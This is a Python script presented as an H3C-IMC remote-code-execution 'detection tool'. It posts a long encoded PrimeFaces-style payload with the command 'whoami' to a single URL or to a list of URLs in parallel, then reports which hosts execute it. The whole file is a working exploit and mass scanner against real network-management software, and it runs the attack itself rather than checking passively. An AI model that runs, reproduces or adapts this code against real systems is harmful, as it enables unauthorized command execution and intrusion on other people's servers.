import requests
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

def banner():
    banner_text = """
     _   _  _____ _____     ________  ________ 
| | | ||____ /  __ \\   |_   _|  \\/  /  __ \\
| |_| |    / / /  \\/_____| | | .  . | /  \\/
|  _  |    \\ \\ |  |______| | | |\\/| | |    
| | | |.___/ / \\__/\\    _| |_| |  | | \\__/\\
\\_| |_\\____/ \\____/    \\___/\\_|  |_|\\____/
    """
    print(banner_text)
    print("Welcome to the H3C-IMC RCE vulnerability detection tool.  Author: Alex")

def check_rce(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close'
    }

    # RCE payload
    payload = {
        'pfdrt': 'sc',
        'ln': 'primefaces',
        'pfdrid': 'uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D',
        'cmd': 'whoami'
    }

    try:
        response = requests.post(url, headers=headers, data=payload, timeout=10)

        # Check for RCE response
        if response.status_code == 200 and "whoami" in response.text:
            return f"[+] {url} has RCE vulnerability"
        else:
            return f"[-] No RCE vulnerability detected on {url}"

    except requests.exceptions.Timeout:
        return f"[*] Timeout while connecting to {url}"
    except requests.exceptions.RequestException as e:
        return f"[*] Could not connect to {url}: {e}"

def check_urls(urls):
    results = []
    with ThreadPoolExecutor(max_workers=10) as executor:  # Adjust max_workers for your needs
        future_to_url = {executor.submit(check_rce, url): url for url in urls}
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                result = future.result()
                results.append(result)
            except Exception as e:
                results.append(f"[*] Error checking {url}: {e}")
    return results

def main():
    banner()

    parser = argparse.ArgumentParser(description="RCE Vulnerability Checker")
    parser.add_argument('-u', '--url', type=str, help='Check a single URL')
    parser.add_argument('-f', '--file', type=str, help='File containing list of URLs')
    parser.add_argument('-o', '--output', type=str, help='Output file to save results')

    args = parser.parse_args()

    results = []

    if args.url:
        results.append(check_rce(args.url))
    elif args.file:
        try:
            with open(args.file, 'r') as file:
                urls = [line.strip() for line in file if line.strip()]
            results.extend(check_urls(urls))
        except FileNotFoundError:
            print(f"[ERROR] File not found: {args.file}")
            return

    if args.output:
        with open(args.output, 'w') as output_file:
            for result in results:
                output_file.write(result + '\n')
                print(result)  # Print to console as well
        print(f"[INFO] Results saved to {args.output}")
    else:
        for result in results:
            print(result)

if __name__ == "__main__":
    main()
